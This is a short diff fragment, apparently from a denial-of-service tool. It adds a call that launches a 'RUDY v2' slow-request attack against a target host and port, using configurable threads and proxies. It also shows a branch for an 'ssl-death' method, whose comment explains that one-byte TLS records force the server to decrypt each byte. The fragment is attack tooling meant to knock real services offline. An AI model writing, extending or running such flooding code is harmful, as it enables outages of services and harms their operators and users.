+    await runRUDYv2(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "ssl-death") {
     // SSL Death Record — 1-byte TLS records force server to AES-GCM decrypt each byte
